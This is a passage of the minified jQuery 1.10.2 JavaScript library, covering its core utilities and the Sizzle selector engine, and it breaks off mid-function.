/*! jQuery v1.10.2 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license
//@ sourceMappingURL=jquery-1.10.2.min.map
*/
(function(e,t){var n,r,i=typeof t,o=e.location,a=e.document,s=a.documentElement,l=e.jQuery,u=e.$,c={},p=[],f="1.10.2",d=p.concat,h=p.push,g=p.slice,m=p.indexOf,y=c.toString,v=c.hasOwnProperty,b=f.trim,x=function(e,t){return new x.fn.init(e,t,r)},w=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,T=/\S+/g,C=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,N=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,k=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,E=/^[\],:{}\s]*$/,S=/(?:^|:|,)(?:\s*\[)+/g,A=/\\(?:["\\\/bfnrt]|u[\da-fA-F]{4})/g,j=/"[^"\\\r\n]*"|true|false|null|-?(?:\d+\.|)\d+(?:[eE][+-]?\d+|)/g,D=/^-ms-/,L=/-([\da-z])/gi,H=function(e,t){return t.toUpperCase()},q=function(e){(a.addEventListener||"load"===e.type||"complete"===a.readyState)&&(_(),x.ready())},_=function(){a.addEventListener?(a.removeEventListener("DOMContentLoaded",q,!1),e.removeEventListener("load",q,!1)):(a.detachEvent("onreadystatechange",q),e.detachEvent("onload",q))};x.fn=x.prototype={jquery:f,constructor:x,init:function(e,n,r){var i,o;if(!e)return this;if("string"==typeof e){if(i="<"===e.charAt(0)&&">"===e.charAt(e.length-1)&&e.length>=3?[null,e,null]:N.exec(e),!i||!i[1]&&n)return!n||n.jquery?(n||r).find(e):this.constructor(n).find(e);if(i[1]){if(n=n instanceof x?n[0]:n,x.merge(this,x.parseHTML(i[1],n&&n.nodeType?n.ownerDocument||n:a,!0)),k.test(i[1])&&x.isPlainObject(n))for(i in n)x.isFunction(this[i])?this[i](n[i]):this.attr(i,n[i]);return this}if(o=a.getElementById(i[2]),o&&o.parentNode){if(o.id!==i[2])return r.find(e);this.length=1,this[0]=o}return this.context=a,this.selector=e,this}return e.nodeType?(this.context=this[0]=e,this.length=1,this):x.isFunction(e)?r.ready(e):(e.selector!==t&&(this.selector=e.selector,this.context=e.context),x.makeArray(e,this))},selector:"",length:0,toArray:function(){return g.call(this)},get:function(e){return null==e?this.toArray():0>e?this[this.length+e]:this[e]},pushStack:function(e){var t=x.merge(this.constructor(),e);return t.prevObject=this,t.context=this.context,t},each:function(e,t){return x.each(this,e,t)},ready:function(e){return x.ready.promise().done(e),this},slice:function(){return this.pushStack(g.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(0>e?t:0);return this.pushStack(n>=0&&t>n?[this[n]]:[])},map:function(e){return this.pushStack(x.map(this,function(t,n){return e.call(t,n,t)}))},end:function(){return this.prevObject||this.constructor(null)},push:h,sort:[].sort,splice:[].splice},x.fn.init.prototype=x.fn,x.extend=x.fn.extend=function(){var e,n,r,i,o,a,s=arguments[0]||{},l=1,u=arguments.length,c=!1;for("boolean"==typeof s&&(c=s,s=arguments[1]||{},l=2),"object"==typeof s||x.isFunction(s)||(s={}),u===l&&(s=this,--l);u>l;l++)if(null!=(o=arguments[l]))for(i in o)e=s[i],r=o[i],s!==r&&(c&&r&&(x.isPlainObject(r)||(n=x.isArray(r)))?(n?(n=!1,a=e&&x.isArray(e)?e:[]):a=e&&x.isPlainObject(e)?e:{},s[i]=x.extend(c,a,r)):r!==t&&(s[i]=r));return s},x.extend({expando:"jQuery"+(f+Math.random()).replace(/\D/g,""),noConflict:function(t){return e.$===x&&(e.$=u),t&&e.jQuery===x&&(e.jQuery=l),x},isReady:!1,readyWait:1,holdReady:function(e){e?x.readyWait++:x.ready(!0)},ready:function(e){if(e===!0?!--x.readyWait:!x.isReady){if(!a.body)return setTimeout(x.ready);x.isReady=!0,e!==!0&&--x.readyWait>0||(n.resolveWith(a,[x]),x.fn.trigger&&x(a).trigger("ready").off("ready"))}},isFunction:function(e){return"function"===x.type(e)},isArray:Array.isArray||function(e){return"array"===x.type(e)},isWindow:function(e){return null!=e&&e==e.window},isNumeric:function(e){return!isNaN(parseFloat(e))&&isFinite(e)},type:function(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?c[y.call(e)]||"object":typeof e},isPlainObject:function(e){var n;if(!e||"object"!==x.type(e)||e.nodeType||x.isWindow(e))return!1;try{if(e.constructor&&!v.call(e,"constructor")&&!v.call(e.constructor.prototype,"isPrototypeOf"))return!1}catch(r){return!1}if(x.support.ownLast)for(n in e)return v.call(e,n);for(n in e);return n===t||v.call(e,n)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},error:function(e){throw Error(e)},parseHTML:function(e,t,n){if(!e||"string"!=typeof e)return null;"boolean"==typeof t&&(n=t,t=!1),t=t||a;var r=k.exec(e),i=!n&&[];return r?[t.createElement(r[1])]:(r=x.buildFragment([e],t,i),i&&x(i).remove(),x.merge([],r.childNodes))},parseJSON:function(n){return e.JSON&&e.JSON.parse?e.JSON.parse(n):null===n?n:"string"==typeof n&&(n=x.trim(n),n&&E.test(n.replace(A,"@").replace(j,"]").replace(S,"")))?Function("return "+n)():(x.error("Invalid JSON: "+n),t)},parseXML:function(n){var r,i;if(!n||"string"!=typeof n)return null;try{e.DOMParser?(i=new DOMParser,r=i.parseFromString(n,"text/xml")):(r=new ActiveXObject("Microsoft.XMLDOM"),r.async="false",r.loadXML(n))}catch(o){r=t}return r&&r.documentElement&&!r.getElementsByTagName("parsererror").length||x.error("Invalid XML: "+n),r},noop:function(){},globalEval:function(t){t&&x.trim(t)&&(e.execScript||function(t){e.eval.call(e,t)})(t)},camelCase:function(e){return e.replace(D,"ms-").replace(L,H)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t,n){var r,i=0,o=e.length,a=M(e);if(n){if(a){for(;o>i;i++)if(r=t.apply(e[i],n),r===!1)break}else for(i in e)if(r=t.apply(e[i],n),r===!1)break}else if(a){for(;o>i;i++)if(r=t.call(e[i],i,e[i]),r===!1)break}else for(i in e)if(r=t.call(e[i],i,e[i]),r===!1)break;return e},trim:b&&!b.call("\ufeff\u00a0")?function(e){return null==e?"":b.call(e)}:function(e){return null==e?"":(e+"").replace(C,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(M(Object(e))?x.merge(n,"string"==typeof e?[e]:e):h.call(n,e)),n},inArray:function(e,t,n){var r;if(t){if(m)return m.call(t,e,n);for(r=t.length,n=n?0>n?Math.max(0,r+n):n:0;r>n;n++)if(n in t&&t[n]===e)return n}return-1},merge:function(e,n){var r=n.length,i=e.length,o=0;if("number"==typeof r)for(;r>o;o++)e[i++]=n[o];else while(n[o]!==t)e[i++]=n[o++];return e.length=i,e},grep:function(e,t,n){var r,i=[],o=0,a=e.length;for(n=!!n;a>o;o++)r=!!t(e[o],o),n!==r&&i.push(e[o]);return i},map:function(e,t,n){var r,i=0,o=e.length,a=M(e),s=[];if(a)for(;o>i;i++)r=t(e[i],i,n),null!=r&&(s[s.length]=r);else for(i in e)r=t(e[i],i,n),null!=r&&(s[s.length]=r);return d.apply([],s)},guid:1,proxy:function(e,n){var r,i,o;return"string"==typeof n&&(o=e[n],n=e,e=o),x.isFunction(e)?(r=g.call(arguments,2),i=function(){return e.apply(n||this,r.concat(g.call(arguments)))},i.guid=e.guid=e.guid||x.guid++,i):t},access:function(e,n,r,i,o,a,s){var l=0,u=e.length,c=null==r;if("object"===x.type(r)){o=!0;for(l in r)x.access(e,n,l,r[l],!0,a,s)}else if(i!==t&&(o=!0,x.isFunction(i)||(s=!0),c&&(s?(n.call(e,i),n=null):(c=n,n=function(e,t,n){return c.call(x(e),n)})),n))for(;u>l;l++)n(e[l],r,s?i:i.call(e[l],l,n(e[l],r)));return o?e:c?n.call(e):u?n(e[0],r):a},now:function(){return(new Date).getTime()},swap:function(e,t,n,r){var i,o,a={};for(o in t)a[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=a[o];return i}}),x.ready.promise=function(t){if(!n)if(n=x.Deferred(),"complete"===a.readyState)setTimeout(x.ready);else if(a.addEventListener)a.addEventListener("DOMContentLoaded",q,!1),e.addEventListener("load",q,!1);else{a.attachEvent("onreadystatechange",q),e.attachEvent("onload",q);var r=!1;try{r=null==e.frameElement&&a.documentElement}catch(i){}r&&r.doScroll&&function o(){if(!x.isReady){try{r.doScroll("left")}catch(e){return setTimeout(o,50)}_(),x.ready()}}()}return n.promise(t)},x.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(e,t){c["[object "+t+"]"]=t.toLowerCase()});function M(e){var t=e.length,n=x.type(e);return x.isWindow(e)?!1:1===e.nodeType&&t?!0:"array"===n||"function"!==n&&(0===t||"number"==typeof t&&t>0&&t-1 in e)}r=x(a),function(e,t){var n,r,i,o,a,s,l,u,c,p,f,d,h,g,m,y,v,b="sizzle"+-new Date,w=e.document,T=0,C=0,N=st(),k=st(),E=st(),S=!1,A=function(e,t){return e===t?(S=!0,0):0},j=typeof t,D=1<<31,L={}.hasOwnProperty,H=[],q=H.pop,_=H.push,M=H.push,O=H.slice,F=H.indexOf||function(e){var t=0,n=this.length;for(;n>t;t++)if(this[t]===e)return t;return-1},B="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",P="[\\x20\\t\\r\\n\\f]",R="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",W=R.replace("w","w#"),$="\\["+P+"*("+R+")"+P+"*(?:([*^$|!~]?=)"+P+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+W+")|)|)"+P+"*\\]",I=":("+R+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+$.replace(3,8)+")*)|.*)\\)|)",z=RegExp("^"+P+"+|((?:^|[^\\\\])(?:\\\\.)*)"+P+"+$","g"),X=RegExp("^"+P+"*,"+P+"*"),U=RegExp("^"+P+"*([>+~]|"+P+")"+P+"*"),V=RegExp(P+"*[+~]"),Y=RegExp("="+P+"*([^\\]'\"]*)"+P+"*\\]","g"),J=RegExp(I),G=RegExp("^"+W+"$"),Q={ID:RegExp("^#("+R+")"),CLASS:RegExp("^\\.("+R+")"),TAG:RegExp("^("+R.replace("w","w*")+")"),ATTR:RegExp("^"+$),PSEUDO:RegExp("^"+I),CHILD:RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+P+"*(even|odd|(([+-]|)(\\d*)n|)"+P+"*(?:([+-]|)"+P+"*(\\d+)|))"+P+"*\\)|)","i"),bool:RegExp("^(?:"+B+")$","i"),needsContext:RegExp("^"+P+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+P+"*((?:-\\d)?\\d*)"+P+"*\\)|)(?=[^-]|$)","i")},K=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,et=/^(?:input|select|textarea|button)$/i,tt=/^h\d$/i,nt=/'|\\/g,rt=RegExp("\\\\([\\da-f]{1,6}"+P+"?|("+P+")|.)","ig"),it=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:0>r?String.fromCharCode(r+65536):String.fromCharCode(55296|r>>10,56320|1023&r)};try{M.apply(H=O.call(w.childNodes),w.childNodes),H[w.childNodes.length].nodeType}catch(ot){M={apply:H.length?function(e,t){_.apply(e,O.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function at(e,t,n,i){var o,a,s,l,u,c,d,m,y,x;if((t?t.ownerDocument||t:w)!==f&&p(t),t=t||f,n=n||[],!e||"string"!=typeof e)return n;if(1!==(l=t.nodeType)&&9!==l)return[];if(h&&!i){if(o=Z.exec(e))if(s=o[1]){if(9===l){if(a=t.getElementById(s),!a||!a.parentNode)return n;if(a.id===s)return n.push(a),n}else if(t.ownerDocument&&(a=t.ownerDocument.getElementById(s))&&v(t,a)&&a.id===s)return n.push(a),n}else{if(o[2])return M.apply(n,t.getElementsByTagName(e)),n;if((s=o[3])&&r.getElementsByClassName&&t.getElementsByClassName)return M.apply(n,t.getElementsByClassName(s)),n}if(r.qsa&&(!g||!g.test(e))){if(m=d=b,y=t,x=9===l&&e,1===l&&"object"!==t.nodeName.toLowerCase()){c=mt(e),(d=t.getAttribute("id"))?m=d.replace(nt,"\\$&"):t.setAttribute("id",m),m="[id='"+m+"'] ",u=c.length;while(u--)c[u]=m+yt(c[u]);y=V.test(e)&&t.parentNode||t,x=c.join(",")}if(x)try{return M.apply(n,y.querySelectorAll(x)),n}catch(T){}finally{d||t.removeAttribute("id")}}}return kt(e.replace(z,"$1"),t,n,i)}function st(){var e=[];function t(n,r){return e.push(n+=" ")>o.cacheLength&&delete t[e.shift()],t[n]=r}return t}function lt(e){return e[b]=!0,e}function ut(e){var t=f.createElement("div");try{return!!e(t)}catch(n){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function ct(e,t){var n=e.split("|"),r=e.length;while(r--)o.attrHandle[n[r]]=t}function pt(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&(~t.sourceIndex||D)-(~e.sourceIndex||D);if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function ft(e){return function(t){var n=t.nodeName.toLowerCase();return"input"===n&&t.type===e}}function dt(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function ht(e){return lt(function(t){return t=+t,lt(function(n,r){var i,o=e([],n.length,t),a=o.length;while(a--)n[i=o[a]]&&(n[i]=!(r[i]=n[i]))})})}s=at.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return t?"HTML"!==t.nodeName:!1},r=at.support={},p=at.setDocument=function(e){var n=e?e.ownerDocument||e:w,i=n.defaultView;return n!==f&&9===n.nodeType&&n.documentElement?(f=n,d=n.documentElement,h=!s(n),i&&i.attachEvent&&i!==i.top&&i.attachEvent("onbeforeunload",function(){p()}),r.attributes=ut(function(e){return e.className="i",!e.getAttribute("className")}),r.getElementsByTagName=ut(function(e){return e.appendChild(n.createComment("")),!e.getElementsByTagName("*").length}),r.getElementsByClassName=ut(function(e){return e.innerHTML="<div class='a'></div><div class='a i'></div>",e.firstChild.className="i",2===e.getElementsByClassName("i").length}),r.getById=ut(function(e){return d.appendChild(e).id=b,!n.getElementsByName||!n.getElementsByName(b).length}),r.getById?(o.find.ID=function(e,t){if(typeof t.getElementById!==j&&h){var n=t.getElementById(e);return n&&n.parentNode?[n]:[]}},o.filter.ID=function(e){var t=e.replace(rt,it);return function(e){return e.getAttribute("id")===t}}):(delete o.find.ID,o.filter.ID=function(e){var t=e.replace(rt,it);return function(e){var n=typeof e.getAttributeNode!==j&&e.getAttributeNode("id");return n&&n.value===t}}),o.find.TAG=r.getElementsByTagName?function(e,n){return typeof n.getElementsByTagName!==j?n.getElementsByTagName(e):t}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},o.find.CLASS=r.getElementsByClassName&&function(e,n){return typeof n.getElementsByClassName!==j&&h?n.getElementsByClassName(e):t},m=[],g=[],(r.qsa=K.test(n.querySelectorAll))&&(ut(function(e){e.innerHTML="<select><option selected=''></option></select>",e.querySelectorAll("[selected]").length||g.push("\\["+P+"*(?:value|"+B+")"),e.querySelectorAll(":checked").length||g.push(":checked")}),ut(function(e){var t=n.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("t",""),e.querySelectorAll("[t^='']").length&&g.push("[*^$]="+P+"*(?:''|\"\")"),e.querySelectorAll(":enabled").length||g.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),g.push(",.*:")})),(r.matchesSelector=K.test(y=d.webkitMatchesSelector||d.mozMatchesSelector||d.oMatchesSelector||d.msMatchesSelector))&&ut(function(e){r.disconnectedMatch=y.call(e,"div"),y.call(e,"[s!='']:x"),m.push("!=",I)}),g=g.length&&RegExp(g.join("|")),m=m.length&&RegExp(m.join("|")),v=K.test(d.contains)||d.compareDocumentPosition?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},A=d.compareDocumentPosition?function(e,t){if(e===t)return S=!0,0;var i=t.compareDocumentPosition&&e.compareDocumentPosition&&e.compareDocumentPosition(t);return i?1&i||!r.sortDetached&&t.compareDocumentPosition(e)===i?e===n||v(w,e)?-1:t===n||v(w,t)?1:c?F.call(c,e)-F.call(c,t):0:4&i?-1:1:e.compareDocumentPosition?-1:1}:function(e,t){var r,i=0,o=e.parentNode,a=t.parentNode,s=[e],l=[t];if(e===t)return S=!0,0;if(!o||!a)return e===n?-1:t===n?1:o?-1:a?1:c?F.call(c,e)-F.call(c,t):0;if(o===a)return pt(e,t);r=e;while(r=r.parentNode)s.unshift(r);r=t;while(r=r.parentNode)l.unshift(r);while(s[i]===l[i])i++;return i?pt(s[i],l[i]):s[i]===w?-1:l[i]===w?1:0},n):f},at.matches=function(e,t){return at(e,null,null,t)},at.matchesSelector=function(e,t){if((e.ownerDocument||e)!==f&&p(e),t=t.replace(Y,"='$1']"),!(!r.matchesSelector||!h||m&&m.test(t)||g&&g.test(t)))try{var n=y.call(e,t);if(n||r.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(i){}return at(t,f,null,[e]).length>0},at.contains=function(e,t){return(e.ownerDocument||e)!==f&&p(e),v(e,t)},at.attr=function(e,n){(e.ownerDocument||e)!==f&&p(e);var i=o.attrHandle[n.toLowerCase()],a=i&&L.call(o.attrHandle,n.toLowerCase())?i(e,n,!h):t;return a===t?r.attributes||!h?e.getAttribute(n):(a=e.getAttributeNode(n))&&a.specified?a.value:null:a},at.error=function(e){throw Error("Syntax error, unrecognized expression: "+e)},at.uniqueSort=function(e){var t,n=[],i=0,o=0;if(S=!r.detectDuplicates,c=!r.sortStable&&e.slice(0),e.sort(A),S){while(t=e[o++])t===e[o]&&(i=n.push(o));while(i--)e.splice(n[i],1)}return e},a=at.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=a(e)}else if(3===i||4===i)return e.nodeValue}else for(;t=e[r];r++)n+=a(t);return n},o=at.selectors={cacheLength:50,createPseudo:lt,match:Q,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(rt,it),e[3]=(e[4]||e[5]||"").replace(rt,it),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||at.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&at.error(e[0]),e},PSEUDO:function(e){var n,r=!e[5]&&e[2];return Q.CHILD.test(e[0])?null:(e[3]&&e[4]!==t?e[2]=e[4]:r&&J.test(r)&&(n=mt(r,!0))&&(n=r.indexOf(")",r.length-n)-r.length)&&(e[0]=e[0].slice(0,n),e[2]=r.slice(0,n)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(rt,it).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=N[e+" "];return t||(t=RegExp("(^|"+P+")"+e+"("+P+"|$)"))&&N(e,function(e){return t.test("string"==typeof e.className&&e.className||typeof e.getAttribute!==j&&e.getAttribute("class")||"")})},ATTR:function(e,t,n){return function(r){var i=at.attr(r,e);return null==i?"!="===t:t?(i+="","="===t?i===n:"!="===t?i!==n:"^="===t?n&&0===i.indexOf(n):"*="===t?n&&i.indexOf(n)>-1:"$="===t?n&&i.slice(-n.length)===n:"~="===t?(" "+i+" ").indexOf(n)>-1:"|="===t?i===n||i.slice(0,n.length+1)===n+"-":!1):!0}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,l){var u,c,p,f,d,h,g=o!==a?"nextSibling":"previousSibling",m=t.parentNode,y=s&&t.nodeName.toLowerCase(),v=!l&&!s;if(m){if(o){while(g){p=t;while(p=p[g])if(s?p.nodeName.toLowerCase()===y:1===p.nodeType)return!1;h=g="only"===e&&!h&&"nextSibling"}return!0}if(h=[a?m.firstChild:m.lastChild],a&&v){c=m[b]||(m[b]={}),u=c[e]||[],d=u[0]===T&&u[1],f=u[0]===T&&u[2],p=d&&m.childNodes[d];while(p=++d&&p&&p[g]||(f=d=0)||h.pop())if(1===p.nodeType&&++f&&p===t){c[e]=[T,d,f];break}}else if(v&&(u=(t[b]||(t[b]={}))[e])&&u[0]===T)f=u[1];else while(p=++d&&p&&p[g]||(f=d=0)||h.pop())if((s?p.nodeName.toLowerCase()===y:1===p.nodeType)&&++f&&(v&&((p[b]||(p[b]={}))[e]=[T,f]),p===t))break;return f-=i,f===r||0===f%r&&f/r>=0}}},PSEUDO:function(e,t){var n,r=o.pseudos[e]||o.setFilters[e.toLowerCase()]||at.error("unsupported pseudo: "+e);return r[b]?r(t):r.length>1?(n=[e,e,"",t],o.setFilters.hasOwnProperty(e.toLowerCase())?lt(function(e,n){var i,o=r(e,t),a=o.length;while(a--)i=F.call(e,o[a]),e[i]=!(n[i]=o[a])}):function(e){return r(e,0,n)}):r}},pseudos:{not:lt(function(e){var t=[],n=[],r=l(e.replace(z,"$1"));return r[b]?lt(function(e,t,n,i){var o,a=r(e,null,i,[]),s=e.length;while(s--)(o=a[s])&&(e[s]=!(t[s]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),!n.pop()}}),has:lt(function(e){return function(t){return at(e,t).length>0}}),contains:lt(function(e){return function(t){return(t.textContent||t.innerText||a(t)).indexOf(e)>-1}}),lang:lt(function(e){return G.test(e||"")||at.error("unsupported lang: "+e),e=e.replace(rt,it).toLowerCase(),function(t){var n;do if(n=h?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return n=n.toLowerCase(),n===e||0===n.indexOf(e+"-");while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===d},focus:function(e){return e===f.activeElement&&(!f.hasFocus||f.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return e.disabled===!1},disabled:function(e){return e.disabled===!0},checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeName>"@"||3===e.nodeType||4===e.nodeType)return!1;return!0},parent:function(e){return!o.pseudos.empty(e)},header:function(e){return tt.test(e.nodeName)},input:function(e){return et.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||t.toLowerCase()===e.type)},first:ht(function(){return[0]}),last:ht(function(e,t){return[t-1]}),eq:ht(function(e,t,n){return[0>n?n+t:n]}),even:ht(function(e,t){var n=0;for(;t>n;n+=2)e.push(n);return e}),odd:ht(function(e,t){var n=1;for(;t>n;n+=2)e.push(n);return e}),lt:ht(function(e,t,n){var r=0>n?n+t:n;for(;--r>=0;)e.push(r);return e}),gt:ht(function(e,t,n){var r=0>n?n+t:n;for(;t>++r;)e.push(r);return e})}},o.pseudos.nth=o.pseudos.eq;for(n in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})o.pseudos[n]=ft(n);for(n in{submit:!0,reset:!0})o.pseudos[n]=dt(n);function gt(){}gt.prototype=o.filters=o.pseudos,o.setFilters=new gt;function mt(e,t){var n,r,i,a,s,l,u,c=k[e+" "];if(c)return t?0:c.slice(0);s=e,l=[],u=o.preFilter;while(s){(!n||(r=X.exec(s)))&&(r&&(s=s.slice(r[0].length)||s),l.push(i=[])),n=!1,(r=U.exec(s))&&(n=r.shift(),i.push({value:n,type:r[0].replace(z," ")}),s=s.slice(n.length));for(a in o.filter)!(r=Q[a].exec(s))||u[a]&&!(r=u[a](r))||(n=r.shift(),i.push({value:n,type:a,matches:r}),s=s.slice(n.length));if(!n)break}return t?s.length:s?at.error(e):k(e,l).slice(0)}function yt(e){var t=0,n=e.length,r="";for(;n>t;t++)r+=e[t].value;return r}function vt(e,t,n){var r=t.dir,o=n&&"parentNode"===r,a=C++;return t.first?function(t,n,i){while(t=t[r])if(1===t.nodeType||o)return e(t,n,i)}:function(t,n,s){var l,u,c,p=T+" "+a;if(s){while(t=t[r])if((1===t.nodeType||o)&&e(t,n,s))return!0}else while(t=t[r])if(1===t.nodeType||o)if(c=t[b]||(t[b]={}),(u=c[r])&&u[0]===p){if((l=u[1])===!0||l===i)return l===!0}else if(u=c[r]=[p],u[1]=e(t,n,s)||i,u[1]===!0)return!0}}function bt(e){return e.length>1?function(t,n,r){var i=e.length;while(i--)if(!e[i](t,n,r))return!1;return!0}:e[0]}function xt(e,t,n,r,i){var o,a=[],s=0,l=e.length,u=null!=t;for(;l>s;s++)(o=e[s])&&(!n||n(o,r,i))&&(a.push(o),u&&t.push(s));return a}function wt(e,t,n,r,i,o){return r&&!r[b]&&(r=wt(r)),i&&!i[b]&&(i=wt(i,o)),lt(function(o,a,s,l){var u,c,p,f=[],d=[],h=a.length,g=o||Nt(t||"*",s.nodeType?[s]:s,[]),m=!e||!o&&t?g:xt(g,f,e,s,l),y=n?i||(o?e:h||r)?[]:a:m;if(n&&n(m,y,s,l),r){u=xt(y,d),r(u,[],s,l),c=u.length;while(c--)(p=u[c])&&(y[d[c]]=!(m[d[c]]=p))}if(o){if(i||e){if(i){u=[],c=y.length;while(c--)(p=y[c])&&u.push(m[c]=p);i(null,y=[],u,l)}c=y.length;while(c--)(p=y[c])&&(u=i?F.call(o,p):f[c])>-1&&(o[u]=!(a[u]=p))}}else y=xt(y===a?y.splice(h,y.length):y),i?i(null,a,y,l):M.apply(a,y)})}function Tt(e){var t,n,r,i=e.length,a=o.relative[e[0].type],s=a||o.relative[" "],l=a?1:0,c=vt(function(e){return e===t},s,!0),p=vt(function(e){return F.call(t,e)>-1},s,!0),f=[function(e,n,r){return!a&&(r||n!==u)||((t=n).nodeType?c(e,n,r):p(e,n,r))}];for(;i>l;l++)if(n=o.relative[e[l].type])f=[vt(bt(f),n)];else{if(n=o.filter[e[l].type].apply(null,e[l].matches),n[b]){for(r=++l;i>r;r++)if(o.relative[e[r].type])break;return wt(l>1&&bt(f),l>1&&yt(e.slice(0,l-1).concat({value:" "===e[l-2].type?"*":""})).replace(z,"$1"),n,r>l&&Tt(e.slice(l,r)),i>r&&Tt(e=e.slice(r)),i>r&&yt(e))}f.push(n)}return bt(f)}function Ct(e,t){var n=0,r=t.length>0,a=e.length>0,s=function(s,l,c,p,d){var h,g,m,y=[],v=0,b="0",x=s&&[],w=null!=d,C=u,N=s||a&&o.find.TAG("*",d&&l.parentNode||l),k=T+=null==C?1:Math.random()||.1;for(w&&(u=l!==f&&l,i=n);null!=(h=N[b]);b++){if(a&&h){g=0;while(m=e[g++])if(m(h,l,c)){p.push(h);break}w&&(T=k,i=++n)}r&&((h=!m&&h)&&v--,s&&x.push(h))}if(v+=b,r&&b!==v){g=0;while(m=t[g++])m(x,y,l,c);if(s){if(v>0)while(b--)x[b]||y[b]||(y[b]=q.call(p));y=xt(y)}M.apply(p,y),w&&!s&&y.length>0&&v+t.length>1&&at.uniqueSort(p)}return w&&(T=k,u=C),x};return r?lt(s):s}l=at.compile=function(e,t){var n,r=[],i=[],o=E[e+" "];if(!o){t||(t=mt(e)),n=t.length;while(n--)o=Tt(t[n]),o[b]?r.push(o):i.push(o);o=E(e,Ct(i,r))}return o};function Nt(e,t,n){var r=0,i=t.length;for(;i>r;r++)at(e,t[r],n);return n}function kt(e,t,n,i){var a,s,u,c,p,f=mt(e);if(!i&&1===f.length){if(s=f[0]=f[0].slice(0),s.length>2&&"ID"===(u=s[0]).type&&r.getById&&9===t.nodeType&&h&&o.relative[s[1].type]){if(t=(o.find.ID(u.matches[0].replace(rt,it),t)||[])[0],!t)return n;e=e.slice(s.shift().value.length)}a=Q.needsContext.test(e)?0:s.length;while(a--){if(u=s[a],o.relative[c=u.type])break;if((p=o.find[c])&&(i=p(u.matches[0].replace(rt,it),V.test(s[0].type)&&t.parentNode||t))){if(s.splice(a,1),e=i.length&&yt(s),!e)return M.apply(n,i),n;break}}}return l(e,f)(i,t,!h,n,V.test(e)),n}r.sortStable=b.split("").sort(A).join("")===b,r.detectDuplicates=S,p(),r.sortDetached=ut(function(e){return 1&e.compareDocumentPosition(f.createElement("div"))}),ut(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||ct("type|href|height|width",function(e,n,r){return r?t:e.getAttribute(n,"type"===n.toLowerCase()?1:2)}),r.attributes&&ut(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||ct("value",function(e,n,r){return 